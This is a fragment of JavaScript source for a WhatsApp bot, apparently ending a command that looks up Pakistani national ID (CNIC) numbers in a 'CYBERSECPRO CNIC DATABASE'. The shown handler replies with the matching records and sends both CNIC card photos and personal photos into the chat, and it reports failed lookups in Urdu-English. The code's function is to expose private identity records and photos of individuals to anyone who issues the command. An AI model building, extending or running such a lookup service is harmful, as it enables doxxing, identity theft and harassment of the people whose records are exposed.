                      rawQuery: _cnQuery,
                      title: '🆔 *CYBERSECPRO CNIC DATABASE*',
                      photos: _cnResult.photos,
                  });
                  await m.reply(_cnMsg);
                  const _cnPhotosSent = await sendSimPhotos(devtrust, m.chat, _cnResult.photos, m);
                  if (!_cnPhotosSent.length && _cnResult.records.some(r => r.cnicPhoto || r.personPhoto)) {
                      await sendSimPhotos(devtrust, m.chat, {
                          cnicPhotos: _cnResult.records.map(r => r.cnicPhoto).filter(Boolean),
                          personPhotos: _cnResult.records.map(r => r.personPhoto).filter(Boolean),
                      }, m);
                  }
                  await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
              } else {
                  await m.reply(`❌ *No records found for CNIC:* ${_cnQuery}\n\n_Ye CNIC database mein nahi hai ya abhi update nahi hua_`);
                  await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
              }
          } catch (_cnErr) {
              await m.reply(`❌ *Lookup failed:* ${_cnErr.message || 'Error'}`);
              await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
          }
          break;
      }
  
    // If no command matched, just ignore
    break;
}

} catch (err) {
      const _protoType = m.message?.protocolMessage?.type;
      if (_protoType === 0 || _protoType === 5) {
          console.error('[ANTIDELETE-ERR]', err?.message || err);
          return;
      }
      console.error('[CMD-ERR]', err?.message || err);
      try { await m.reply(`❌ Error: ${err?.message || 'Unknown error'}`); } catch (_) {}
  }
}

// watchFile removed — dangerous in multi-bot
